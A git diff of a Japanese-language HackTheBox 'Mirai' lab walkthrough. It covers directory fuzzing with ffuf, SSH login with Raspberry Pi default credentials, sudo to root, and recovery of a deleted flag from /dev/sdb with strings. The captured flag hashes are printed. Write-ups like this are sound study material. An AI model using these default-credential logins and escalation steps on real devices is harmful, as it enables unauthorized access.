@@ -25,6 +25,44 @@ Nmap done: 1 IP address (1 host up) scanned in 0.67 seconds
 
 
 ## STEP 2
+80番にアクセス、なんも表示されない  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Mirai_01.png">  
+列挙すると、adminを発見
+```sh
+└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://10.129.159.64/FUZZ  
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.129.159.64/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 315ms]
+versions                [Status: 200, Size: 18, Words: 1, Lines: 1, Duration: 299ms]
+:: Progress: [29999/29999] :: Job [1/1] :: 103 req/sec :: Duration: [0:04:33] :: Errors: 1 ::
+```
+adminにアクセス  
+pi-holeというラズパイ用の広告ドメインブロックDNSサーバが動いているっぽい  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Mirai_02.png">  
+ログイン画面  
+デフォルトクレデンシャルをググってみたところ、「pi」「raspberry」らしいがログインできず  
+<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Mirai_03.png">  
+22番が開いていたのでログイン試行したところ成功！  
+ユーザフラグゲット
 ```sh
 └─$ ssh pi@10.129.159.64 
 The authenticity of host '10.129.159.64 (10.129.159.64)' can't be established.
@@ -55,7 +93,9 @@ ff837707441b257a20e32199d7c8838d
 
 
 ## STEP 3
-```
+sudoでrootに権限昇格できたが、肝心のrootフラグはダミーでした  
+「USB stick」にバックアップがあるっぽい
+```sh
 pi@raspberrypi:~ $ sudo -l
 Matching Defaults entries for pi on localhost:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
@@ -69,8 +109,11 @@ pi@raspberrypi:~ $ sudo su
 root@raspberrypi:/home/pi# cat /root/root.txt
 I lost my original root.txt! I think I may have a backup on my USB stick...
 ```
+「USB stick」はおそらく「/media/usbstick」だと推測  
+「/media/usbstick/damnit.txt」を確認したところ、ファイルが消えたとのこと  
+が、取り戻す方法があるらしい  
 ```sh
-root@raspberrypi:~# df -T
+root@raspberrypi:/home/pi# df -T
 Filesystem     Type     1K-blocks    Used Available Use% Mounted on
 aufs           aufs       8856504 2836172   5547400  34% /
 tmpfs          tmpfs       102396    4884     97512   5% /run
@@ -94,5 +137,40 @@ root@raspberrypi:/home/pi# cat /media/usbstick/damnit.txt
 Damnit! Sorry man I accidentally deleted your files off the USB stick.
 Do you know if there is any way to get them back?
 
+-James
+```
+今回「/media/usbstick」のデバイスファイルは、「/dev/sdb」でありその中からデータを捜索することができるらしい  
+詳細は[リンク](https://kashiwaba-yuki.com/hackthebox-linux-mirai)  
+ということでルートフラグゲット！
+```sh
+root@raspberrypi:/home/pi# lsblk
+NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
+sda      8:0    0   10G  0 disk 
+├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
+└─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
+sdb      8:16   0   10M  0 disk /media/usbstick
+sr0     11:0    1 1024M  0 rom  
+loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfs
+
+root@raspberrypi:/home/pi# strings /dev/sdb
+>r &
+/media/usbstick
+lost+found
+root.txt
+damnit.txt
+>r &
+lost+found
+root.txt
+damnit.txt
+>r &
+/media/usbstick
+2]8^
+lost+found
+root.txt
+damnit.txt
+>r &
+3d3e483143ff12ec505d026fa13e020b
+Damnit! Sorry man I accidentally deleted your files off the USB stick.
+Do you know if there is any way to get them back?
 -James
 ```
